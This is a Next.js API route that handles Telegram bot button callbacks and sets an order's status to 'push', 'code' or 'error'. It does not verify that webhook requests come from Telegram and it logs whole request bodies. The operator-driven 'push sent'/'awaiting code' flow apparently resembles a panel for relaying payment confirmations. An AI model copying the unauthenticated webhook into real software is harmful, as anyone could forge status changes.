import { NextRequest, NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import { setOrderStatus } from '@/lib/order-status';

export const dynamic = 'force-dynamic';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';

// Этот endpoint будет вызываться Telegram при нажатии на inline кнопки
// Нужно настроить webhook в Telegram боте на этот URL

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    
    // Обрабатываем callback_query от inline кнопок
    if (body.callback_query) {
      const { data, message } = body.callback_query;
      const chatId = message.chat.id;
      const messageId = message.message_id;
      
      // Парсим callback_data: push_order123456, code_order123456, error_order123456
      // Формат: action_orderId (где orderId начинается с "order")
      const underscoreIndex = data.indexOf('_');
      if (underscoreIndex === -1) {
        console.error('Invalid callback data format:', data);
        return NextResponse.json({ ok: false, error: 'Invalid format' }, { status: 400 });
      }
      
      const action = data.substring(0, underscoreIndex); // push, code, или error
      const orderId = data.substring(underscoreIndex + 1); // order123456...
      
      console.log('Telegram callback received:', { action, orderId, data, fullBody: JSON.stringify(body) });
      
      if (!orderId || !action) {
        console.error('Invalid callback data:', { action, orderId, data });
        return NextResponse.json({ ok: false, error: 'Invalid callback data' }, { status: 400 });
      }
      
      // Обновляем статус заказа в базе данных
      // Ищем заказ по orderId (нужно будет сохранять orderId при создании заказа)
      // Пока используем временное решение - сохраняем в отдельной таблице или в JSON поле
      
      // Отвечаем на callback, чтобы убрать "часики" в Telegram
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
      await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: body.callback_query.id,
          text: action === 'push' ? 'Push отправлен' : action === 'code' ? 'Ожидание кода' : 'Ошибка обработана',
        }),
      });
      
      // Обновляем статус заказа напрямую
      const statusMap: Record<string, 'push' | 'code' | 'error'> = {
        'push': 'push',
        'code': 'code',
        'error': 'error'
      };
      
      const status = statusMap[action];
      if (status && orderId) {
        setOrderStatus(orderId, status);
        console.log(`Order status updated: ${orderId} -> ${status}`);
      } else {
        console.error('Invalid action or orderId:', { action, orderId, status });
      }
      
      return NextResponse.json({ ok: true, action, orderId, status });
    }
    
    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('Telegram callback error:', error);
    return NextResponse.json({ ok: false, error: 'Internal error' }, { status: 500 });
  }
}
